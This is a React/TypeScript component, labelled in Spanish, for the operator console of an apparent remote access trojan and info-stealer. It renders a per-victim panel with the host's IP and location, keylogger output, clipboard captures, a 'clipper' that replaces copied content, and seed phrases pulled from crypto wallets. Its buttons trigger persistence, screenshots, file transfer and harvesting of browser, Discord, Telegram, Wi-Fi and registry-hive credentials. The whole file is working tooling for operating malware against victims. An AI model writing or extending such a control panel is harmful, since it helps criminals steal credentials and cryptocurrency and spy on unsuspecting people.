'use client';
import { useState } from 'react';
import {
  Archive, Camera, Copy, ExternalLink, FileSearch, Files, KeyRound, MessageSquare,
  Monitor, Power, RefreshCw, ShieldOff, Tag, TerminalSquare, Wallet, X
} from 'lucide-react';
import { useApi, mutate } from '@/hooks/useApi';
import { toast } from 'sonner';
import type { Artifact, ClipboardEntry, Keylog, Victim, Wallet as WalletType } from '@/lib/types';
import { ago, copy, dateTime, flag, osIcon, osTone, short } from '@/lib/format';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Empty, ErrorState, SkeletonRows } from '@/components/ui/table';
import { WalletTable } from '@/components/wallet-table';
import { FileTree } from '@/components/file-tree';
import { TaskList } from '@/components/task-list';
import { EventFeed } from '@/components/event-feed';
import { ChatPanel } from '@/components/chat-panel';
import { MonitorPanel } from '@/components/monitor-panel';
import { cn } from '@/lib/cn';

export type DetailTab = 'resumen' | 'ficheros' | 'keylogger' | 'clipboard' | 'credenciales' | 'wallets' | 'tareas' | 'eventos' | 'monitor' | 'chat';

const TABS: Array<{ id: DetailTab; label: string }> = [
  { id: 'resumen', label: 'Resumen' },
  { id: 'ficheros', label: 'Ficheros' },
  { id: 'keylogger', label: 'Keylogger' },
  { id: 'clipboard', label: 'Portapapeles' },
  { id: 'credenciales', label: 'Credenciales' },
  { id: 'wallets', label: 'Wallets' },
  { id: 'tareas', label: 'Tareas' },
  { id: 'eventos', label: 'Eventos' },
  { id: 'monitor', label: 'Monitor' },
  { id: 'chat', label: 'Chat' }
];

function TabEmpty({ title, hint, action, label }: { title: string; hint: string; action: () => void; label: string }) {
  return <Empty title={title} hint={hint} action={<Button size="sm" onClick={action}>{label}</Button>} />;
}

export function VictimDetail({
  victim,
  tab,
  onTab,
  onAction,
  onClose,
  onBulk
}: {
  victim: Victim;
  tab: DetailTab;
  onTab: (tab: DetailTab) => void;
  onAction: (id: string) => void;
  onClose: () => void;
  onBulk: () => void;
}) {
  const [keyQuery, setKeyQuery] = useState('');
  const [clipQuery, setClipQuery] = useState('');
  const wallets = useApi<{ items: WalletType[] }>(`/victims/${victim.id}/wallets`, { pollMs: 10_000 });
  const seeds = useApi<{ items: Array<{ id: string; path: string; type: string; words: number; value: string; createdAt: string }> }>(`/victims/${victim.id}/seeds`, { pollMs: 15_000 });
  const files = useApi<{ artifacts: Artifact[] }>(`/victims/${victim.id}/files`);
  const keylogs = useApi<{ items: Keylog[] }>(`/victims/${victim.id}/keylogs?q=${encodeURIComponent(keyQuery)}&limit=200`);
  const clipboard = useApi<{ items: ClipboardEntry[] }>(`/victims/${victim.id}/clipboard?q=${encodeURIComponent(clipQuery)}`);
  const screenshots = useApi<{ items: Array<{ id: string; ts: string; width: number | null; height: number | null }> }>(`/victims/${victim.id}/screenshots`);
  const tasks = useApi<{ items: Array<{ id: string; name: string; status: string }> }>(`/tasks?victim=${victim.id}&limit=20`, { pollMs: 5_000 });
  const [cancelling, setCancelling] = useState('');
  const active = (tasks.data?.items ?? []).find((task) => ['queued', 'running'].includes(task.status));

  async function cancel(taskId: string) {
    setCancelling(taskId);
    try {
      await mutate(`/tasks/${taskId}/cancel`, 'POST');
      tasks.refresh();
    } catch (caught) {
      toast.error(caught instanceof Error ? caught.message : 'no se pudo cancelar');
    } finally {
      setCancelling('');
    }
  }

  const offline = !victim.socket;

  return (
    <aside className="flex h-full min-h-0 w-full flex-col bg-panel" aria-label={`Detalle de ${victim.hostname}`}>
      <div className="shrink-0 border-b border-line/80 bg-panel/80 p-4 backdrop-blur">
        <div className="flex items-start gap-2">
          <div className="min-w-0 flex-1">
            <p className="truncate font-mono text-base font-semibold text-ink">{victim.hostname}</p>
            <p className="truncate font-mono text-2xs text-muted">{victim.username} · {short(victim.id)}</p>
          </div>
          <Button size="icon" variant="ghost" onClick={onClose} title="Cerrar detalle"><X className="h-3.5 w-3.5" /></Button>
        </div>
        <div className="mt-1.5 flex flex-wrap items-center gap-1">
          <Badge tone={victim.online ? 'ok' : victim.revokedAt ? 'bad' : 'warn'}>{victim.online ? 'online' : victim.status}</Badge>
          <Badge tone={victim.socket ? 'ok' : 'warn'}>{victim.socket ? 'socket' : 'sin socket'}</Badge>
          <Badge>{osIcon(victim.os)} {victim.os}</Badge>
          <Badge tone="brand">{victim.profile}</Badge>
          <span className="ml-auto text-2xs text-muted">{flag(victim.countryCode)} {victim.country ?? '—'}</span>
        </div>
        {active ? (
          <div className="mt-2 rounded border border-warn/30 bg-warn/10 p-1.5">
            <div className="flex items-center gap-2 text-2xs text-warn">
              <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-warn" />
              <span className="font-mono">{active.name}</span>
              <span>{active.status}</span>
              <Button size="sm" variant="ghost" className="ml-auto h-5 px-1 text-warn" loading={cancelling === active.id} onClick={() => cancel(active.id)}>cancelar</Button>
            </div>
            <div className="mt-1 h-0.5 overflow-hidden rounded bg-warn/20"><div className="h-full w-1/3 animate-shimmer bg-warn" /></div>
          </div>
        ) : null}
        <div className="mt-2 flex flex-wrap gap-1">
          <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('screenshot')}><Camera className="h-3 w-3" /> captura</Button>
          <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('harvest')}><Archive className="h-3 w-3" /> harvest</Button>
          <Button size="sm" variant="secondary" disabled={offline} onClick={() => onTab('chat')}><MessageSquare className="h-3 w-3" /> chat</Button>
          <Button size="sm" variant="secondary" onClick={() => onAction('tags')}><Tag className="h-3 w-3" /> nota</Button>
          <Button size="sm" variant="secondary" onClick={onBulk}><Files className="h-3 w-3" /> lote</Button>
        </div>
      </div>

      <Tabs value={tab} onValueChange={(value) => onTab(value as DetailTab)} className="flex min-h-0 flex-1 flex-col">
        <TabsList className="shrink-0 overflow-x-auto border-b border-line/80 bg-panel/60 px-2">
          {TABS.map((item) => <TabsTrigger key={item.id} value={item.id} className="shrink-0 whitespace-nowrap px-3 py-2">{item.label}</TabsTrigger>)}
        </TabsList>
        <div className="min-h-0 flex-1 overflow-y-auto p-4">
          <TabsContent value="resumen" className="mt-0">
            <dl className="grid grid-cols-[96px_1fr] gap-y-1.5 text-xs">
              <dt className="text-muted">Equipo</dt><dd className="font-mono">{victim.hostname}</dd>
              <dt className="text-muted">Usuario</dt><dd className="font-mono">{victim.username}</dd>
              <dt className="text-muted">SO</dt><dd className={osTone(victim.os)}>{victim.os} {victim.osVersion} · {victim.arch}</dd>
              <dt className="text-muted">Agente</dt><dd className="font-mono">{victim.agentVersion || '—'}</dd>
              <dt className="text-muted">Identidad</dt>
              <dd>
                <Badge className={cn(victim.identityState === 'confirmed' && 'border-ok/40 text-ok')}>
                  {victim.identityState ?? 'confirmed'}
                </Badge>
                <span className="ml-2 font-mono text-muted">epoch {victim.keyEpoch ?? 1}</span>
              </dd>
              <dt className="text-muted">Build</dt><dd className="font-mono">{victim.build?.name ?? '—'} v{victim.build?.version ?? '—'}</dd>
              <dt className="text-muted">IP</dt><dd className="font-mono">{victim.ip ?? '—'} <button onClick={() => { copy(victim.ip ?? ''); toast.success('IP copiada'); }}><Copy className="inline h-2.5 w-2.5" /></button></dd>
              <dt className="text-muted">País</dt><dd>{flag(victim.countryCode)} {victim.country ?? '—'} {victim.city ? `· ${victim.city}` : ''}</dd>
              <dt className="text-muted">Primera vez</dt><dd className="font-mono">{dateTime(victim.firstSeenAt)}</dd>
              <dt className="text-muted">Última señal</dt><dd className="font-mono">{dateTime(victim.lastHeartbeatAt)} ({ago(victim.lastHeartbeatAt)})</dd>
              <dt className="text-muted">Artefactos</dt><dd className="num">{victim._count?.artifacts ?? victim.artifacts ?? 0}</dd>
              <dt className="text-muted">Grupo</dt><dd>{victim.tags.length ? victim.tags.map((tag) => <Badge key={tag} className="mr-1">{tag}</Badge>) : '—'}</dd>
            </dl>
            {!victim.socket ? <p className="mt-3 rounded border border-warn/30 bg-warn/10 p-2 text-2xs text-warn">Sin socket de control: las acciones se rechazarán con <span className="font-mono">agent_offline</span>. El estado online solo refleja el último heartbeat.</p> : null}
            {victim.identityState && victim.identityState !== 'confirmed' ? <p className="mt-3 rounded border border-warn/30 bg-warn/10 p-2 text-2xs text-warn">Identidad <span className="font-mono">{victim.identityState}</span>: no se ha probado posesión del token. Si no se confirma, la gracia promociona el token pendiente.</p> : null}
            <div className="mt-3 flex flex-wrap gap-1">
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('processes')}><TerminalSquare className="h-3 w-3" /> procesos</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('persist-on')}><Power className="h-3 w-3" /> persistir</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('revoke')}><ShieldOff className="h-3 w-3" /> revocar</Button>
            </div>
            {victim.lat != null ? <a className="mt-2 flex items-center gap-1 text-2xs text-brand" target="_blank" href={`https://www.openstreetmap.org/?mlat=${victim.lat}&mlon=${victim.lon}#map=12/${victim.lat}/${victim.lon}`}>mapa <ExternalLink className="h-2.5 w-2.5" /></a> : null}
          </TabsContent>

          <TabsContent value="ficheros" className="mt-0">
            <div className="mb-2 flex gap-1">
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('download')}><FileSearch className="h-3 w-3" /> descargar</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('search')}><SearchIcon /> buscar</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('upload')}>subir</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('compress')}>comprimir</Button>
              <Button size="sm" variant="ghost" onClick={files.refresh}><RefreshCw className="h-3 w-3" /></Button>
            </div>
            {files.error ? <ErrorState message={files.error.message} retry={files.refresh} /> : <FileTree artifacts={files.data?.artifacts ?? []} onDeleted={files.refresh} />}
          </TabsContent>

          <TabsContent value="keylogger" className="mt-0">
            <input value={keyQuery} onChange={(event) => setKeyQuery(event.target.value)} placeholder="buscar texto o ventana" className="mb-2 h-7 w-full rounded border border-line bg-bg px-2 font-mono text-xs" />
            {keylogs.loading ? <SkeletonRows rows={8} cols={2} /> : (keylogs.data?.items ?? []).length === 0 ? (
              <TabEmpty title="Sin keylogs" hint="Activa el keylogger con agent keys on y luego vuelca con keys dump." action={() => onAction('harvest')} label="volcar ahora" />
            ) : (keylogs.data!.items).map((row) => (
              <div key={row.id} className="border-b border-line/50 py-1">
                <p className="text-2xs text-muted">{dateTime(row.ts)} · {row.process} · {row.title}{row.count && row.count > 1 ? ` · ×${row.count}` : ''}</p>
                <p className={cn('break-all font-mono text-xs', row.password && 'text-warn')}>{row.text}</p>
              </div>
            ))}
          </TabsContent>

          <TabsContent value="clipboard" className="mt-0">
            <input value={clipQuery} onChange={(event) => setClipQuery(event.target.value)} placeholder="buscar portapapeles" className="mb-2 h-7 w-full rounded border border-line bg-bg px-2 font-mono text-xs" />
            {clipboard.loading ? <SkeletonRows rows={8} cols={2} /> : (clipboard.data?.items ?? []).length === 0 ? (
              <TabEmpty title="Sin portapapeles" hint="Arranca el clipper para registrar cambios y secretos copiados." action={() => onAction('clip-start')} label="iniciar clipper" />
            ) : (clipboard.data!.items).map((row) => (
              <div key={row.id} className="flex items-start gap-2 border-b border-line/50 py-1">
                <Badge tone={row.kind === 'text' ? 'default' : 'brand'}>{row.kind}</Badge>
                <div className="min-w-0 flex-1">
                  <p className="break-all font-mono text-xs">{row.content}</p>
                  <p className="text-2xs text-muted">{dateTime(row.ts)} · {row.process} · {row.window}{row.replaced ? ` · reemplazado → ${row.replaced}` : ''}</p>
                </div>
                <Button size="icon" variant="ghost" onClick={() => copy(row.content)}><Copy className="h-3 w-3" /></Button>
              </div>
            ))}
          </TabsContent>

          <TabsContent value="credenciales" className="mt-0 space-y-2">
            <div className="grid grid-cols-2 gap-2">
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('harvest')}><Archive className="h-3 w-3" /> harvest</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('hives')}><TerminalSquare className="h-3 w-3" /> hives</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('harvest-browsers')}>navegadores</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('harvest-discord')}>discord</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('harvest-telegram')}>telegram</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('harvest-wifi')}>wifi</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('harvest-productkey')}>productkey</Button>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('scan')}><Wallet className="h-3 w-3" /> escanear wallets</Button>
            </div>
            <div className="rounded border border-line p-2 text-xs">
              <p className="mb-1 flex items-center gap-1 text-2xs uppercase tracking-wide text-muted"><KeyRound className="h-3 w-3" /> Seeds y claves</p>
              {seeds.loading ? <SkeletonRows rows={3} cols={2} /> : (seeds.data?.items ?? []).length === 0 ? (
                <p className="py-2 text-2xs text-muted">Sin seeds. Lanza scan_wallets para extraerlas de vaults y ficheros.</p>
              ) : (seeds.data!.items).slice(0, 20).map((seed) => (
                <div key={seed.id} className="flex items-start gap-2 border-t border-line/50 py-1">
                  <Badge tone="ok">{seed.type}</Badge>
                  <div className="min-w-0 flex-1"><p className="break-all font-mono text-2xs">{seed.value || '(en artefacto)'}</p><p className="text-2xs text-muted">{seed.words > 0 ? `${seed.words} palabras · ` : ''}{seed.path}</p></div>
                  {seed.value ? <Button size="icon" variant="ghost" onClick={() => { copy(seed.value); toast.success('Seed copiada'); }}><Copy className="h-3 w-3" /></Button> : null}
                </div>
              ))}
            </div>
          </TabsContent>

          <TabsContent value="wallets" className="mt-0">
            <WalletTable victimId={victim.id} items={wallets.data?.items ?? []} loading={wallets.loading} refresh={wallets.refresh} linked={!offline} />
          </TabsContent>

          <TabsContent value="tareas" className="mt-0"><TaskList victim={victim.id} /></TabsContent>
          <TabsContent value="eventos" className="mt-0"><EventFeed victim={victim.id} /></TabsContent>

          <TabsContent value="monitor" className="mt-0">
            <MonitorPanel victim={victim} />
            <div className="mb-2 mt-3 flex items-center justify-between border-t border-line pt-2">
              <p className="text-2xs uppercase tracking-wide text-muted">Capturas</p>
              <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('screenshot')}><Monitor className="h-3 w-3" /> capturar</Button>
            </div>
            {(screenshots.data?.items ?? []).length === 0 ? (
              <TabEmpty title="Sin capturas" hint="La captura puntual usa screenshot. El streaming continuo llega con el módulo monitor." action={() => onAction('screenshot')} label="primera captura" />
            ) : (
              <div className="grid grid-cols-2 gap-2">
                {(screenshots.data!.items).map((shot) => (
                  <a key={shot.id} href={`/api/console/screenshots/${shot.id}/image`} target="_blank" className="group overflow-hidden rounded border border-line">
                    <img src={`/api/console/screenshots/${shot.id}/image`} alt={`captura ${shot.ts}`} loading="lazy" className="aspect-video w-full object-cover group-hover:opacity-80" />
                    <p className="p-1 text-2xs text-muted">{dateTime(shot.ts)}</p>
                  </a>
                ))}
              </div>
            )}
          </TabsContent>

          <TabsContent value="chat" className="mt-0"><ChatPanel victim={victim} /></TabsContent>
        </div>
      </Tabs>
    </aside>
  );
}

function SearchIcon() {
  return <FileSearch className="h-3 w-3" />;
}
